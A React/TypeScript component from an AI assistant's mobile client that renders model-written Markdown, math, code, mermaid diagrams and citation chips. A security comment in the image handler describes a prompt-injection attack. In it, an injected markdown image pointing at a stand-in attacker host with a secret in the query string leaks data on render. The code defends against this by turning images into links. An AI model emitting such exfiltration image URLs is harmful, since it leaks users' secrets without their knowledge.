import { MermaidDiagram } from "@/components/MermaidDiagram";
import { remarkCitations } from "@/components/remarkCitations";
// Assistant-message Markdown for the mobile client (前端技术与架构 §七 · 富渲染).
//
// Full stack now (matches desktop coverage, minimal-deps variant): react-markdown +
// remark-gfm (headings/lists/tables/task lists/code) + remark-math & rehype-katex (math)
// + rehype-highlight (token-class code highlighting, themed via markdown.css onto the
// semantic tokens) + lazy mermaid (```mermaid → diagram, dynamically imported so it never
// bloats the main bundle) + inline `[n]` citation chips (remarkCitations → cite:n links
// resolved against the message's source list).
//
// This is a pure rendering leaf (no drift surface — it never touches the protocol fold).
import type { Citation } from "@agentcore/contract-types";
import { memo, useMemo } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import "katex/dist/katex.min.css";
import "@/components/markdown.css";

const rehypePlugins = [rehypeKatex, rehypeHighlight];

/** Render Markdown text. `muted` reads a notch quieter (a turn's reasoning) than the
 *  answer body. `citations`, when present, turns inline `[n]` markers into chips that
 *  link to the matching source. */
export const Markdown = memo(function Markdown({
  content,
  muted = false,
  citations,
}: {
  content: string;
  muted?: boolean;
  citations?: Citation[];
}) {
  const remarkPlugins = useMemo(() => {
    const base = [remarkGfm, remarkMath];
    return citations && citations.length > 0
      ? [...base, remarkCitations(citations.length)]
      : base;
  }, [citations]);

  const components = useMemo<Components>(
    () => ({
      a({ href, children, ...props }) {
        if (href?.startsWith("cite:")) {
          const n = Number(href.slice(5));
          const source = citations?.[n - 1];
          if (source) {
            return (
              <a
                className="cite-chip"
                href={source.url}
                target="_blank"
                rel="noreferrer"
                title={source.title || source.url}
              >
                {n}
              </a>
            );
          }
          return <sup className="cite-chip">{n}</sup>;
        }
        return (
          <a href={href} target="_blank" rel="noreferrer" {...props}>
            {children}
          </a>
        );
      },
      img({ src, alt }) {
        // SECURITY (PI-001 提示注入·渲染侧外泄): downgrade every model-emitted markdown
        // image to a click-to-open link — never an auto-loading <img>. No rehype-raw is
        // loaded, so `![](url)` is the only image path; without this an injected
        // `![](http://attacker/?d=<secret>)` would fetch on render = a silent, no-click
        // exfil beacon. As a link, egress needs an explicit user click.
        const href = typeof src === "string" ? src : undefined;
        const label = typeof alt === "string" && alt.trim() ? alt.trim() : "图片链接";
        if (!href) return <>{label}</>;
        return (
          <a href={href} target="_blank" rel="noreferrer">
            {label}
          </a>
        );
      },
      code({ className, children, ...props }) {
        const lang = /language-(\w+)/.exec(className || "")?.[1];
        if (lang === "mermaid") {
          return <MermaidDiagram chart={String(children).replace(/\n$/, "")} />;
        }
        return (
          <code className={className} {...props}>
            {children}
          </code>
        );
      },
    }),
    [citations],
  );

  return (
    <div className={`md${muted ? " md-muted" : ""}`}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        rehypePlugins={rehypePlugins}
        components={components}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
});
